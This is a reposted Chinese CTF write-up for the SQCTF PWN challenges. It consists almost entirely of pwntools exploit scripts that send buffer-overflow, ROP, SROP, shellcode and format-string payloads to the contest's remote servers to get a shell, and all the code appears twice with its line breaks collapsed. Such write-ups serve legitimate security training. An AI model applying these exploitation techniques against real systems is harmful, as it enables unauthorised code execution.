# 【WP】第四届SQCTF网络安全及信息对抗大赛PWN方向题目

> 原文: https://www.ctfiot.com/243289.html
> ID: 243289

接上文

【WP】第四届SQCTF网络安全及信息对抗大赛WEB方向题目全解

【WP】第四届SQCTF网络安全及信息对抗大赛Crypto方向题目全解

【WP】第四届SQCTF网络安全及信息对抗大赛Re方向题目全解

继续整理PWN方向的WP

from pwn import *from LibcSearcher import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 31125)#p=process('./cat')
backdoor = 0x40121Bpayload = b'a'*(0x50+0x8)+p64(backdoor)p.sendlineafter(b'charactersn',payload)p.interactive()

rax = 0x3brdi = "/bin//sh"指针rsi = 0rdx = 0syscall

from pwn import *from LibcSearcher import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 30871)#p=process('./pwn')#p=gdb.debug('./pwn','b main')
shellcode = '''    xor rsi,rsi    push rsi    mov rdi,0x68732f2f6e69622f    push rdi    push rsp    pop rdi    mov rax,0x3b    cdq    syscall'''payload=asm(shellcode)p.sendafter(b'window.n',payload)p.interactive()

rax = 0x3brdi = "/bin/sh"rsi = 0rdx = 0syscall

from pwn import *from LibcSearcher import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 32328)#p=process('./pwn01')#p=gdb.debug('./pwn01','b _start')
frame = SigreturnFrame()frame.rdi = 0x40203a               # "/bin/sh"frame.rsi = 0                       # argv = NULLframe.rdx = 0                       # envp = NULLframe.rax = 59                      # execveframe.rip = 0x40101d                # syscall instructionrop = b'a'*0x8rop += p64(0x401049) #pop rsi; pop rax; retnrop += p64(0)rop += p64(15)rop += p64(0x40101d) #syscallrop += bytes(frame)   p.send(rop)p.interactive()

from pwn import *from LibcSearcher import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 32420)#p=process('./gift')
backdoor = 0x4011DCpayload = b'a'*(0x40+0x8)+p64(backdoor)p.sendlineafter(b'gift?n',payload)p.interactive()

from pwn import *from LibcSearcher import *import base64context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 31613)#p=process('./pwn02')
backdoor = 0x401422payload = b'a'*(0x60+0x8)+p64(backdoor)+p64(0)payload = base64.b64encode(payload)p.sendlineafter(b'now?n',payload)p.interactive()

from pwn import *from LibcSearcher import *import base64context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 32436)#p=process('./pwn')
pop_rdx_rsi_rdi_rax_ret = 0x4011E0syscall_addr = 0x4011ECp.sendline(b'/bin/shx00')p.recvuntil(b'0x')binsh_addr = int(p.recv(12),16)p.recv()p.sendline(b'1')payload = b'/bin/shx00'+b'a'*0x20+p64(pop_rdx_rsi_rdi_rax_ret)+p64(0)+p64(0)+p64(binsh_addr)+p64(0x3b)+p64(syscall_addr)p.sendline(payload)p.interactive()

from pwn import *from LibcSearcher import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 31171)#p=process('./pwn03')elf = ELF('./pwn03')
p.sendlineafter(b'sun.n',b'%11$p-%15$p-%17$p')p.recvuntil(b'0x')canary = int(p.recv(16),16)p.recvuntil(b'0x')proc = int(p.recv(12),16)proc_base = proc-0x125bp.recvuntil(b'0x')stack = int(p.recv(12),16)stack_input = stack-0x148main_addr = 0x1260pop_rdi_ret = 0x1245pop_rbp_ret = 0x11d3call_system = 0x1253leave_ret = 0x1234system_plt = elf.plt['system']ret_addr = 0x125Apayload = b'a'*0x8+p64(canary)+p64(0xdeadbeef)+p64(proc_base+main_addr)p.send(payload)payload = p64(proc_base+ret_addr)+p64(proc_base+pop_rdi_ret)+p64(stack_input-0x10)+p64(proc_base+call_system)+b'/bin/sh'p.sendafter(b'sun.n',payload)payload = b'a'*0x8+p64(canary)+p64(stack_input-0x30-0x8)+p64(proc_base+leave_ret)p.send(payload)p.interactive()

from pwn import *from LibcSearcher import *from struct import packfrom ctypes import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 30422)#p=process('./key')elf = ELF('./key')
payload = b'x46x54x43x55x4ex51x53x00'p.sendafter(b'key: ',payload)p.interactive()

from pwn import *from LibcSearcher import *from struct import packfrom ctypes import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 30632)#p=process('./bad')elf = ELF('./bad')
shellcode=asm(shellcraft.sh())payload = shellcode.ljust(0x48,b'x00')+p64(0x4040A0)p.sendlineafter(b'do ?n',payload)p.interactive()


```
from pwn import *from LibcSearcher import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 31125)#p=process('./cat')
backdoor = 0x40121Bpayload = b'a'*(0x50+0x8)+p64(backdoor)p.sendlineafter(b'charactersn',payload)p.interactive()
```



```
rax = 0x3brdi = "/bin//sh"指针rsi = 0rdx = 0syscall
```



```
from pwn import *from LibcSearcher import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 30871)#p=process('./pwn')#p=gdb.debug('./pwn','b main')
shellcode = '''    xor rsi,rsi    push rsi    mov rdi,0x68732f2f6e69622f    push rdi    push rsp    pop rdi    mov rax,0x3b    cdq    syscall'''payload=asm(shellcode)p.sendafter(b'window.n',payload)p.interactive()
```



```
rax = 0x3brdi = "/bin/sh"rsi = 0rdx = 0syscall
```



```
from pwn import *from LibcSearcher import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 32328)#p=process('./pwn01')#p=gdb.debug('./pwn01','b _start')
frame = SigreturnFrame()frame.rdi = 0x40203a               # "/bin/sh"frame.rsi = 0                       # argv = NULLframe.rdx = 0                       # envp = NULLframe.rax = 59                      # execveframe.rip = 0x40101d                # syscall instructionrop = b'a'*0x8rop += p64(0x401049) #pop rsi; pop rax; retnrop += p64(0)rop += p64(15)rop += p64(0x40101d) #syscallrop += bytes(frame)   p.send(rop)p.interactive()
```



```
from pwn import *from LibcSearcher import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 32420)#p=process('./gift')
backdoor = 0x4011DCpayload = b'a'*(0x40+0x8)+p64(backdoor)p.sendlineafter(b'gift?n',payload)p.interactive()
```



```
from pwn import *from LibcSearcher import *import base64context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 31613)#p=process('./pwn02')
backdoor = 0x401422payload = b'a'*(0x60+0x8)+p64(backdoor)+p64(0)payload = base64.b64encode(payload)p.sendlineafter(b'now?n',payload)p.interactive()
```



```
from pwn import *from LibcSearcher import *import base64context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 32436)#p=process('./pwn')
pop_rdx_rsi_rdi_rax_ret = 0x4011E0syscall_addr = 0x4011ECp.sendline(b'/bin/shx00')p.recvuntil(b'0x')binsh_addr = int(p.recv(12),16)p.recv()p.sendline(b'1')payload = b'/bin/shx00'+b'a'*0x20+p64(pop_rdx_rsi_rdi_rax_ret)+p64(0)+p64(0)+p64(binsh_addr)+p64(0x3b)+p64(syscall_addr)p.sendline(payload)p.interactive()
```



```
from pwn import *from LibcSearcher import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 31171)#p=process('./pwn03')elf = ELF('./pwn03')
p.sendlineafter(b'sun.n',b'%11$p-%15$p-%17$p')p.recvuntil(b'0x')canary = int(p.recv(16),16)p.recvuntil(b'0x')proc = int(p.recv(12),16)proc_base = proc-0x125bp.recvuntil(b'0x')stack = int(p.recv(12),16)stack_input = stack-0x148main_addr = 0x1260pop_rdi_ret = 0x1245pop_rbp_ret = 0x11d3call_system = 0x1253leave_ret = 0x1234system_plt = elf.plt['system']ret_addr = 0x125Apayload = b'a'*0x8+p64(canary)+p64(0xdeadbeef)+p64(proc_base+main_addr)p.send(payload)payload = p64(proc_base+ret_addr)+p64(proc_base+pop_rdi_ret)+p64(stack_input-0x10)+p64(proc_base+call_system)+b'/bin/sh'p.sendafter(b'sun.n',payload)payload = b'a'*0x8+p64(canary)+p64(stack_input-0x30-0x8)+p64(proc_base+leave_ret)p.send(payload)p.interactive()
```



```
from pwn import *from LibcSearcher import *from struct import packfrom ctypes import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 30422)#p=process('./key')elf = ELF('./key')
payload = b'x46x54x43x55x4ex51x53x00'p.sendafter(b'key: ',payload)p.interactive()
```



```
from pwn import *from LibcSearcher import *from struct import packfrom ctypes import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 30632)#p=process('./bad')elf = ELF('./bad')
shellcode=asm(shellcraft.sh())payload = shellcode.ljust(0x48,b'x00')+p64(0x4040A0)p.sendlineafter(b'do ?n',payload)p.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-e3ab9c4357270b0fa7b33c23bc749ebe.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-678bf4e1ce762272e9e700833e987a4f.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-20c2a6e872178bf6bc42d34187fb703a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-896519166c5a5d02cebda3cadf8dee95.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-1d45be1016ca8f2acead8b1093dad488-1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-6b581c3f81dc4943fbc40aa1634e1ed8.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-ee64e24b3a97d2da21983e043c7afd0f.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-2b8650265b48ea26a0d4ec48501ee76d.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-0dfba6896c2c96a3b7a9b9b25fea62ca-1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-3d3abe58caf9c66571a13de142492554.png)